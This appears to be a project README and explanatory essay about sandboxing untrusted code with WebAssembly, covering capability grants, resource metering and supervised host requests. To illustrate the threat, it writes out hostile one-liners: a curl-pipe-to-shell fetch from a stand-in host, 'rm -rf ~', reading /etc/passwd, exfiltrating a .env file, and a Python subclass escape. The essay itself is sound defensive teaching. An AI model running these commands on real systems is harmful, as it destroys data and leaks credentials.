# wasm-sandbox

---

# Running Code You Don't Trust

> How to run code written by a stranger, a student, or an AI without betting your machine on it. The whole trick is one inversion: don't try to lock dangerous code down. Start it with nothing, then hand back only what you choose.

Sooner or later every product grows a feature that runs someone else's code. The **Run** button under a tutorial. A spreadsheet formula. A plugin marketplace. An AI assistant that asks, "want me to run that for you?" They all make the same bet: *take code we didn't write, and execute it on our hardware.*

You would never double-click a `.py` file a stranger emailed you. Your software does the moral equivalent thousands of times a day. This is how to make that genuinely safe — not safe-ish, not safe-until-someone-clever-shows-up. Safe.

---

## Start with the pain, because it's expensive

Say you run a site that teaches Python, and you add a Run button. Within the hour, someone types this into it:

```python
import os
os.system("curl https://evil.sh | sh")
```

If you ran that the obvious way, the lesson is over and so is your week. Here's the part worth internalizing: **the snippet didn't have to be clever.** Plain `exec(user_code)` hands a stranger everything the host process can touch — files, environment variables, saved credentials, the network, any database connection you left open — instantly and ambiently. Three one-liners and you're done:

```python
os.system("rm -rf ~")                              # the files
open("/etc/passwd").read()                         # the secrets
requests.post(attacker, data=open(".env").read())  # the keys
```

Put concrete numbers on it, because this is the cost a decision has to weigh:

- **Time to total compromise:** milliseconds. There is no review step, no second chance, no undo.
- **Blast radius:** the entire account the process runs as. Not the snippet's data — *everything* the host can reach.
- **Cost of being wrong once:** a leaked credential, a wiped disk, a pivot into your network. One bad run, not a thousand.

And here's the kicker that kills most teams' enthusiasm: the *malicious* user and the *confused beginner who pasted a Stack Overflow answer they didn't understand* are the same incident. You're not just defending against attackers. You're defending against honest mistakes that happen to be destructive.

So the real question isn't "is this risky?" It's "what would actually make it not risky?" Before reaching for a tool, it's worth being honest about why the popular answers don't clear the bar.

---

## The alternatives, and why each one loses

Everyone tries these in roughly this order. Each fails for a reason worth naming, because the failures define what a real solution has to do.

**1. Just run it.** Covered above. The default is *unlimited trust*. Non-starter.

**2. Block the dangerous stuff.** Strip `__builtins__`, ban the word `import`, regex out `os`, `eval`, `open`. This *feels* like security and is the opposite, because Python hands the attacker a ladder back to everything you "removed":

```python
# no import keyword, yet this reaches process spawners, file openers, the lot
().__class__.__bases__[0].__subclasses__()
```

A blocklist is a bet that you imagined every attack. You didn't, and the people probing it do this for fun. You will lose this race forever.

**3. Lock it down at the OS.** Fork a process, drop privileges, add a `seccomp` syscall filter, wrap it in namespaces. Now you're hand-rolling a container runtime, per platform, and getting it subtly wrong where you can't see it. The Linux kernel exposes **300+ syscalls** across tens of millions of lines of C — that's your attack surface, and you're defending it by hand. Tight enough to be safe usually means too tight to be useful.

**4. Give every run its own VM or container.** Finally correct — and too heavy for the job. Real isolation, but you pay for it: container and microVM cold starts run from **~100ms to multiple seconds**, plus a whole guest OS to patch, an image to maintain, and a daemon to babysit. Fine for a nightly batch job. Nobody ships that behind a Run button meant to feel instant for a snippet that executes in 40ms.

Lay them side by side and the pattern is obvious:

| Approach | Isolated by default? | Real language? | Startup | Maintenance burden |
|---|---|---|---|---|
| `exec()` | No — total trust | Yes | ~0ms | None (and no safety) |
| Blocklist | No — leaks endlessly | Yes | ~0ms | Infinite cat-and-mouse |
| seccomp / namespaces | Partly | Yes | low | High, per-platform, fragile |
| VM / container per run | Yes | Yes | 100ms–seconds | Heavy (OS, images, daemon) |
| **What we want** | **Yes** | **Yes** | **~1ms** | **Low** |

Every viable option except the last shares one disease: **it starts the code with full power and scrambles to take it back.** The default is *allow*, and your job becomes an endless game of subtraction where forgetting one item loses the game.

The fix is to stop subtracting.

---

## What "good" actually has to mean

If you're going to choose a sandbox, these are the criteria that matter — the bar any honest solution has to clear:

1. **Isolated by default.** The code starts with no files, no network, no env, no host memory. You *add* powers; you never *remove* them.
2. **Real language, real ergonomics.** People write normal code and get real tracebacks. Not a crippled DSL.
3. **Fast enough to be invisible.** Single-digit milliseconds to start, so it works behind an interactive button.
4. **Capabilities you grant by name.** Want it to read one folder or call one API? Hand over exactly that, nothing adjacent.
5. **Hard resource limits.** CPU, memory, and wall-clock are capped, so "infinite loop" is a shrug, not an outage.
6. **Low operational weight.** No fleet of VMs to patch.

There's exactly one mainstream technology that hits all six. You've probably only seen it make games run in a browser tab.

---

## The idea: start from zero

Flip the polarity. Instead of a powerful runtime you frantically restrain, use a runtime that, the moment it boots, can do *nothing* — and then deliberately hand back the few abilities you actually want.

The technical name for the shift is **permissions → capabilities**, and the difference is the whole ballgame:

- A **permission** model says "you may not do X," then trusts a referee to enforce that against code actively lying about who it is.
- A **capability** model says "you don't hold a reference to X, so the question never comes up."

You can't misuse a key you were never handed. You can't escape a room with no doors. It's "deny by default" taken *literally* — not as a policy you maintain, but as a fact about the box.

The only thing that ever made this impractical was performance: a box that truly starts empty was historically also slow and awkward. That's the part that changed.

---

## How it works: WebAssembly

Run the untrusted code as **WebAssembly**.

Here's the property people miss because they met WASM as a browser toy: a `.wasm` module genuinely starts with nothing. It has its own **linear memory** — one flat array of bytes it cannot grow past its limit or point *outside of*. There is no WebAssembly instruction to read host memory, open a file, make a network call, or invoke a syscall. Those powers aren't restricted; they're *absent from the instruction set*.

So how does a module ever do anything useful? One way only: it calls a function the host **explicitly imported into it, by name.** Import nothing and you've got a sealed calculator — it can compute and hand back a result, and that's the entire extent of its reach into your world.

And you don't need a new language to live there. Mature toolchains compile Python, JavaScript, Rust, Go, and C to WebAssembly — so you can drop a *real interpreter* inside the sealed box. The user writes ordinary code with real libraries and real stack traces. It just runs inside a machine that can't see your disk.

Standing the box up looks like this — and the important part is everything it *doesn't* do:

```python
# Pseudocode for configuring a WebAssembly sandbox

store = Store(engine)
store.set_fuel(BUDGET)             # CPU: each instruction costs fuel
store.set_memory_limit(256 * MB)   # RAM: a hard ceiling
store.set_deadline(WALL_CLOCK)     # time: interrupt if it overruns

caps = Capabilities()
# caps.allow_network(...)   <- never called. there is no socket.
# caps.preopen("/")         <- never called. there is no filesystem.
# caps.inherit_env()        <- never called. os.environ is empty.
caps.preopen(scratch_dir, as="/work")   # the ONE door you cut

instantiate(store, module, caps).run()
```

Trace what that buys you. `import socket`? Dead end — no socket was granted. Read `/etc/passwd`? There is no `/etc`; the guest sees one scratch folder and nothing above it, so there's no path to traverse to. Steal env vars? `os.environ` is whatever you put there, never the host's. The guest gets one temp directory and the ability to think.

Everything else is defense in depth stacked on a machine that already couldn't hurt you — which is a great place to build from, because every extra wall is a bonus rather than a load-bearing prayer.

---

## The guardrails: meters and request slips

Two jobs remain. First, stop the box from running forever or eating all the RAM — not by asking nicely, but by making it impossible. WebAssembly meters compute and memory at the instruction level, so the limits are exact:

- **Fuel** caps CPU: charge one unit per instruction, trap when it's gone. `while True: pass` spends its allowance and dies with a clean error instead of pinning a core.
- **A deadline** caps time, so code that *blocks* instead of spinning still gets cut off.
- **A memory ceiling** caps RAM: an over-budget allocation fails *inside* the guest as an ordinary `MemoryError`. It can't squeeze the host, because it has no host memory to reach.
- **An output bound** caps what comes back, so nothing drowns you in a terabyte of result.

Second — and this is the pattern to remember — give it the *useful* powers without giving up isolation. The move: **the guest never receives a capability. It receives the right to ask for one.**

When code inside the box wants to read a record, nothing dangerous happens inside the box. It writes a small request — a *slip* — to its scratch dir: *"please run this query."* Your trusted code, **outside** the wall, picks up the slip and decides, every single time, whether to honor it. The guest holds no connection and no socket; it holds a polite request you can inspect, rewrite, rate-limit, or refuse.

Three example doors, each adjudicated outside:

- **Data.** "Read this record." Your code re-checks who the user is and what they're allowed to touch, on every call, and caps how many rows and bytes come back. The guest never holds the database.
- **Other code.** "Call this other function." Your code re-authorizes against the *original* caller and runs the callee in its own fresh box, with a depth limit so nothing recurses you to death.
- **Network.** "Fetch this URL." Your code checks it against an allowlist and an SSRF denylist, pins a validated address, and bounds the response. The author writes `http.get(url)` and never touches a raw socket.

Every door is **shut by default.** A fresh box computes and returns a value and nothing else until you deliberately cut a specific door — and even then it's a supervised request, not a handle you tossed over the wall.

Two more walls underneath, because good systems assume their own layers can fail:

**Pin the runtime to a hash, not a hope.** The interpreter you run shouldn't be "whatever was lying around." Fetch a specific artifact and refuse to run it unless its hash matches a value you committed on purpose:

```python
blob = download(RUNTIME_URL)
if sha256(blob) != EXPECTED_SHA256:
    raise SystemExit("refusing to run an unverified runtime")
```

You're no longer trusting a download server to still be honest tomorrow — you're trusting a number. Treat third-party packages the same way: install only an explicit allowlist (empty means *nothing*), and prefer prebuilt artifacts so no package's install script runs build code on your trusted host. Anything a package carries only wakes up *inside* the box, where it's already powerless.

**Make workers disposable.** Run each job in a throwaway process, fresh instance, environment scrubbed of secrets. If a run times out, crashes, or misbehaves, kill it and spawn a clean one — a poisoned worker can't serve the next person. And beneath WASM's own meters, add the OS's classic resource limits (CPU seconds, file size, open files) as a last backstop.

Count the walls a hostile snippet has to beat, in order: the memory boundary, the empty capability set, fuel, the deadline, the memory cap, the output bound, the shut-by-default doors, the hashed runtime, the allowlisted installer, the disposable process, and the OS limits under all of it. To do harm it has to beat *every one*. To be useful it just has to be ordinary code. That asymmetry — trivial to use, near-impossible to abuse — is what a sandbox actually is.

---

## The payoff almost nobody is using yet

Now flip the box around, because the exact property that makes it safe for a stranger's code makes it the best place to *learn* to code that has ever existed — and that use case is wide open.

Think about how a kid or a brand-new junior dev learns today. The good stuff — touching a real database, calling a real API, seeing a query return something you didn't expect — sits behind a wall of fear. *Don't run that, you'll drop the table. Don't paste that, it might be malware. Don't touch prod. Set up a local environment first* — and three days later they're still fighting a broken virtualenv instead of learning anything. The safe environments are fake (a frozen tutorial, a console that only pretends). The real environments are dangerous. So beginners are stuck choosing between consequence-free pretend and consequence-everywhere reality.

The box erases that choice: **real on the inside, sealed on the outside.** If you sat down to design the perfect place for a person to learn, this is what you'd draw.

Inside, they write genuine code and get genuine tracebacks. Give them a data door and a real query returns a real record, shaped in a way that surprises them — and they learn from the surprise. Give them a network door and they call a live API. Here's what they *can't* do, no matter how hard they try, on a dare or by accident:

- `rm -rf` anything — there's no filesystem to delete.
- Leak an API key — the box never held one.
- Melt the laptop with an infinite loop — fuel runs out, the loop dies, the prompt returns.
- Drop the production table — every data request is re-checked outside, and a read-only learner stays read-only no matter what they type.
- Get phished into pasting an exploit — outbound requests are screened, and there's no raw socket anyway.
- Poison the next student's session — their worker is thrown away.

That changes what experimenting *feels* like. The single most valuable thing a beginner can do is the thing they're trained to fear: **break it on purpose and read the error.** Run the query wrong. Hit the API wrong. Write the infinite loop just to see. In this box the answer to "what happens if…?" is always a real, honest, educational result — a traceback, a timeout, a polite refusal — and never a wiped machine or a 3 a.m. incident. The cost of curiosity drops to zero, and curiosity at zero cost is the entire engine of learning to build.

The usual options are bad driving lessons: an empty parking lot at midnight (safe, but nothing real happens) or live rush-hour traffic (real, but unforgiving). The sandbox is the third one nobody gets to offer — **real traffic, in a car that physically can't crash into anything that matters.**

---

## What it doesn't solve

Anything that only lists strengths is a sales brochure, so, plainly — and none of this retreats from the claim, it sharpens it:

- **The box isolates the guest, not the code you wrote around it.** A bug in the WebAssembly engine, or in *your* code that services the request slips, lives outside the wall. That's exactly why the doors are adjudicated outside and why the OS limits and disposable workers sit underneath.
- **Side channels aren't the threat model.** This stops a guest from reading your memory, files, secrets, and network. It doesn't promise defense against exotic timing or microarchitectural leaks. If that's your adversary, you want true hardware isolation.
- **A door you opened is a door.** Allow the network and allowlist a host, and code can reach that host within your bounds. The doors shrink and supervise capability; they don't make a *granted* capability harmless. Open them on purpose.
- **The runtime is a living dependency.** Safety leans on the engine and the pinned interpreter; keep both current. A hash pin means you're running the artifact you vetted — not that the artifact is flawless forever.

The wall is strong precisely because it never pretends to be the only wall.

---

## Bottom line

Untrusted code is dangerous because every easy way to run it starts by granting everything and begs you to claw it back. WebAssembly starts by granting *nothing* and lets you hand back, by name, only the doors you choose. Compile a real language into it and you get a real interpreter inside a sealed machine; meter the fuel, time, memory, and output and "forever" and "all of it" become impossible; turn every dangerous power into a request slip your code approves from outside the wall; pin the runtime to a hash, install only what you vetted, throw the worker away after each run, and put the OS's own limits underneath.

What you're left with is one property that reads two ways depending on who's standing in front of the box.

To the engineer feeding it a stranger's code: *the malicious snippet and the buggy snippet are the same harmless problem.*

To the person learning to write that snippet: *every mistake is real enough to teach you and contained enough to forgive you.*

A blast radius of zero, by construction. It's the only kind worth trusting with a stranger's code — and the only kind safe enough to hand a beginner the keys.

